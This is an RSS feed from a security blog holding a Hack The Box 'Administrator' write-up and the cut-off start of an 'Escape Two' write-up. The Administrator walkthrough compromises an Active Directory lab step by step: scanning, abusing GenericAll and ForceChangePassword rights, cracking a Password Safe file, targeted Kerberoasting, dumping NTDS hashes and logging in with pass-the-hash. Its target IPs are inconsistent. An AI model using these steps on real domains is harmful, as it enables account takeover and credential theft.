<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Windows on SolarSpectre</title><link>https://solarspectre.github.io/tags/windows/</link><description>Recent content in Windows on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Administrator - Writeup</title><link>https://solarspectre.github.io/p/htb-administrator-writeup/</link><pubDate>Tue, 01 Apr 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-administrator-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg" alt="Featured image of post HTB Administrator - Writeup" />&lt;h3 id="enumeration">Enumeration
&lt;/h3>&lt;p>Let&amp;rsquo;s start with a scan to all ports:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p- --open --min-rate &lt;span class="m">5000&lt;/span> -vvv -n -Pn 10.10.11.61 -oG allPorts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here are the open ports&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5 syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open http-rpc-epmap syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ldapssl syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open globalcatLDAP syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open globalcatLDAPssl syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open wsman syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open adws syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open winrm syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.95 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2025-04-11 16:52 EDT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.26s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp Microsoft ftpd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ SYST: Windows_NT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-04-12 03:52:41Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open mc-nmf .NET Message Framing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>add the domain to your /etc/hosts file&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">10.10.11.61 administrator.htb dc.administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Run netexec with the credentials from hackthebox&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc winrm 10.10.11.42 -u Olivia -p ichliebedich
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WINRM 10.10.11.42 &lt;span class="m">5985&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> administrator.htb&lt;span class="se">\o&lt;/span>livia:ichliebedich &lt;span class="o">(&lt;/span>Pwn3d!&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login to the machine using evil-winrm and run SharpHound to look for Attack paths&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u olivia -p &lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">upload SharpHound.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael&amp;rsquo;s account&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/1.png"
width="768"
height="193"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_5452d1cb76675978.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/1_hu_aff7a081dde9a9c1.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="397"
data-flex-basis="955px"
>
And Michael Can ForceChangePassword of Benjamin&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/2.png"
width="768"
height="164"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_7b78de711b72a0e2.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/2_hu_67524f6fadb9ffaf.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="468"
data-flex-basis="1123px"
>
To reset the password for these users you can use this commands&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;Olivia&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span> -S dc.administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net rpc password &lt;span class="s2">&amp;#34;benjamin&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> -U &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;michael&amp;#34;&lt;/span>%&lt;span class="s1">&amp;#39;P@ssw00rd!231!!!&amp;#39;&lt;/span> -S dc.administrator.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;p>With these accounts you can look for access to other services like smb or ftp&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Banner: Microsoft FTP Service
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> benjamin:P@ssw00rd!555!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Directory Listing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FTP 10.10.11.42 &lt;span class="m">21&lt;/span> 10.10.11.42 10-05-24 09:13AM &lt;span class="m">952&lt;/span> Backup.psafe3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc ftp 10.10.11.42 -u benjamin -p &lt;span class="s1">&amp;#39;P@ssw00rd!555!!!&amp;#39;&lt;/span> --get Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>this is a password database file that&amp;rsquo;s protected by a master password, to crack that password you can use john the ripper&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">pwsafe2john Backup.psafe3 &amp;gt; psafe3.hash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john psafe3.hash --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>pwsafe, Password Safe &lt;span class="o">[&lt;/span>SHA256 256/256 AVX2 8x&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">2048&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">2&lt;/span> OpenMP threads
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tekieromucho &lt;span class="o">(&lt;/span>Backu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>with this password, open the database with passwordsafe&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo apt install passwordsafe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pwsafe Backup.psafe3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>you can login as emily with evil-winrm&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u emily -p PASSWORD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>mily&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> user.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">XXXXXXXXXXXXXXXXXXXXXXXXXXX
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan&amp;rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan&amp;rsquo;s account and crack it with johntheripper&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/3.png"
width="768"
height="201"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_c44c08755ace5602.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/3_hu_6c4b917d3779a5.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="382"
data-flex-basis="917px"
>
Use faketime to sync your time with the DC and targetedKerberoast to execute the attack
&lt;a class="link" href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener"
>https://github.com/ShutdownRepo/targetedKerberoast&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">faketime &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="k">$(&lt;/span>ntpdate -q dc.administrator.htb &lt;span class="p">|&lt;/span> grep -oP &lt;span class="s1">&amp;#39;\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> python targetedKerberoast.py -d &lt;span class="s2">&amp;#34;administrator.htb&amp;#34;&lt;/span> -u &lt;span class="s2">&amp;#34;emily&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;XXXXXXXXXXXXXXXXXXXXX&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And crack the hash with john&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">john hash.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now that we have access to ethan&amp;rsquo;s account, we can dump the hashes for the administrator and obtain the root flag&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-administrator-writeup/4.png"
width="768"
height="271"
srcset="https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_9a19eebed6ee0f32.png 480w, https://solarspectre.github.io/p/htb-administrator-writeup/4_hu_5a21c04038ef84d7.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="283"
data-flex-basis="680px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nxc smb 192.168.1.100 -u ethan -p &lt;span class="s1">&amp;#39;XXXXXXXXXXXXXX&amp;#39;&lt;/span> --ntds --users administrator
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login with evil-winrm as administrator and get the flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> root.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak&lt;/p>
&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item><item><title>HTB Escape Two - Writeup</title><link>https://solarspectre.github.io/p/htb-escape-two-writeup/</link><pubDate>Mon, 17 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-escape-two-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/cover.png" alt="Featured image of post HTB Escape Two - Writeup" />&lt;h3 id="enumeration">Enumeration
&lt;/h3>&lt;p>Let&amp;rsquo;s start with a scan to all ports:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p- --open --min-rate &lt;span class="m">5000&lt;/span> -vvv -n -Pn 10.10.11.51 -oG allPorts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/1.png"
width="408"
height="503"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_40439663a3a11e59.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/1_hu_5c031bd46bfe2bbb.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="81"
data-flex-basis="194px"
>&lt;/p>
&lt;p>once it&amp;rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
